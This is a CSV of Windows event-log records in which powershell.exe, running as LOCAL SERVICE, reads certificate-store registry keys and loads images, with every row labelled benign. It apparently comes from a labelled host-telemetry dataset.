2022-05-13T08:54:08.9310000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9360000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Root\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9510000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9560000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9610000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\SmartCardRoot\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\TrustedPeople\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\TrustedPeople\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9660000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9710000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\trust\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\trust\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9760000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9860000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.8760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9960000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.9960000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.0010000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
